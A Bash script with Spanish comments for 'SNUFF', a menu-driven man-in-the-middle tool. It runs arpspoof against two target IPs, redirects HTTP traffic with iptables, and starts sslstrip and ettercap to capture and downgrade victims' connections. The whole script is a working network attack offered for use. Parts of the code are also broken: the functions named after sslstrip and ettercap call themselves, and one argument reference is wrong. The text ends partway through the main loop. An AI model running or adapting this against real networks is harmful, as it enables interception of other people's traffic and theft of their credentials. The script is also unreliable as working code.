#!/bin/bash

# Definimos algunos colores ANSI para el menú
ROJO="\033[0;31m"
VERDE="\033[0;32m"
AMARILLO="\033[0;33m"
AZUL="\033[0;34m"
MAGENTA="\033[0;35m"
CIAN="\033[0;36m"
BLANCO="\033[0;37m"
RESET="\033[0m"

# Definimos una función para mostrar el menú
function menu {
	# Limpiamos la pantalla
	clear
	# Mostramos el título del menú con el color azul
	printf "${AZUL}SNUFF - Herramienta de ARP spoofing y SSL stripping${RESET}\n\n"
	# Mostramos las opciones del menú con el color verde
	printf "${VERDE}1) Ejecutar el script con los parámetros dados${RESET}\n"
	printf "${VERDE}2) Ver las dependencias del script${RESET}\n"
	printf "${VERDE}3) Instalar las dependencias del script${RESET}\n"
	printf "${VERDE}4) Salir del script${RESET}\n\n"
	# Pedimos al usuario que introduzca una opción con el color amarillo
	printf "${AMARILLO}Introduce una opción [1-4]: ${RESET}"
	# Leemos la opción introducida por el usuario y la guardamos en la variable opcion
	read opcion
}

# Definimos una función para ejecutar el script con los parámetros dados
function ejecutar {
	# Comprobamos que se han pasado tres argumentos al script
	if [[ $# -ne 3 ]]; then
		# Si no se han pasado tres argumentos, mostramos un mensaje de error con el color rojo y volvemos al menú
		printf "${ROJO}Error: se requieren tres parámetros: objetivo1, objetivo2 e interfaz${RESET}\n"
		sleep 2
		menu
	else
		# Si se han pasado tres argumentos, guardamos los argumentos en variables para usarlos más fácilmente
		OBJETIVO1=$1 # La primera dirección IP a la que queremos hacer ARP spoofing
		OBJETIVO2=$2 # La segunda dirección IP a la que queremos hacer ARP spoofing
		INTERFAZ=$3 # La interfaz de red que vamos a usar

		# Llamamos a las funciones definidas anteriormente con los argumentos correspondientes
		arpspoofing $OBJETIVO1 $OBJETIVO2 $INTERFAZ

		iptables_rules

		sslstrip

		ettercap $INTERFAZ
	fi
}

# Definimos una función para ver las dependencias del script
function ver_dependencias {
	# Mostramos el contenido del archivo requirements.txt con el color cian
	printf "${CIAN}"
	cat requirements.txt
	printf "${RESET}\n"
	# Esperamos a que el usuario pulse una tecla para volver al menú
	read -p "Pulsa una tecla para volver al menú..."
	menu
}

# Definimos una función para instalar las dependencias del script
function instalar_dependencias {
	# Mostramos un mensaje de confirmación con el color magenta
	printf "${MAGENTA}¿Estás seguro de que quieres instalar las dependencias del script? (s/n): ${RESET}"
	# Leemos la respuesta del usuario y la guardamos en la variable respuesta
	read respuesta
	# Comprobamos si la respuesta es s o S (sí)
	if [[ $respuesta == "s" || $respuesta == "S" ]]; then
		# Si es sí, instalamos las dependencias usando el comando pip install -r requirements.txt y mostramos un mensaje de éxito con el color verde
		pip install -r requirements.txt
		printf "${VERDE}Dependencias instaladas correctamente${RESET}\n"
	else
		# Si no es sí, mostramos un mensaje de cancelación con el color rojo
		printf "${ROJO}Instalación cancelada${RESET}\n"
	fi
	# Esperamos a que el usuario pulse una tecla para volver al menú
	read -p "Pulsa una tecla para volver al menú..."
	menu	
}

# Definimos una función para salir del script
function salir {
	# Mostramos un mensaje de despedida con el color blanco y terminamos el script con el código 0 (éxito)
	printf "${BLANCO}Gracias por usar SNUFF. Hasta pronto.${RESET}\n"
	exit 0
}

# Definimos las funciones que ya tenías para el script original

# Código original de snuff

# Esta función limpia los recursos usados por el script
function cleanup {
	printf "* limpiando\n"
	pkill ettercap
	pkill sslstrip
	iptables -t nat -D PREROUTING 1
	echo 0 > /proc/sys/net/ipv4/ip_forward
	exit 0
}

# Esta función realiza el ARP spoofing entre dos objetivos
function arpspoofing {
	printf "* ARP spoofing entre $1 y $2\n"
	# Verificamos si hay algún proceso de arpspoof en ejecución
	if pgrep arpspoof > /dev/null; then
		# Si hay, lo terminamos
		pkill arpspoof
	fi
	# Ejecutamos arpspoof en segundo plano y redirigimos la salida a /dev/null
	arpspoof -i $3 -t $1 $2 > /dev/null 2>&1 &
}

# Esta función configura las reglas de iptables para redirigir el tráfico HTTP al puerto 10000
function iptables_rules {
	printf "* configurando las reglas de iptables\n"
	# Eliminamos la regla existente si la hay
	iptables -t nat -D PREROUTING 1 2> /dev/null
	# Añadimos la nueva regla
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
}

# Esta función inicia el programa sslstrip para interceptar las conexiones HTTPS
function sslstrip {
	printf "* iniciando sslstrip\n"
	# Verificamos si hay algún proceso de sslstrip en ejecución
	if pgrep sslstrip > /dev/null; then
		# Si hay, lo terminamos
		pkill sslstrip
	fi
	# Ejecutamos sslstrip con las opciones adecuadas en segundo plano
	sslstrip -a -f -k &
}

# Esta función inicia el programa ettercap para capturar los paquetes de red
function ettercap {
	printf "* iniciando ettercap\n"
	# Verificamos si hay algún proceso de ettercap en ejecución
	if pgrep ettercap > /dev/null; then
		# Si hay, lo terminamos
		pkill ettercap
	fi
	# Ejecutamos ettercap con las opciones adecuadas en primer plano
	ettercap -T -q -a $HOME/cfg/snuff.etter.conf -i $3
}

# Llamamos a la función menu para mostrar el menú al usuario
menu

# Usamos un bucle while para repetir el menú hasta que el usuario elija salir
while true; do
	# Usamos un case para ejecutar la acción correspondiente a la opción elegida por el usuario
	case $opcion in
		1) # Si el usuario elige la opción 1, ejecutamos el script con los parámetros dados
			ejecutar $@
			;;
		2) # Si el usuario elige la opción 2, vemos las dependencias del script
			ver_dependencias
			;;
		3) # Si el usuario elige la opción 3, instalamos las dependencias del script
			instalar_dependencias
			;;
        4) # Si el usuario elige la opción 4, salimos del script 
            salir 
            ;; 
        *) # Si el usuario elige una opción no válida, mostramos un mensaje de error con el color rojo y volvemos al menú 
            printf "${ROJO}Opción no válida. Introduce una opción entre 1 y 4.${RESET}\n" 
            sleep 2
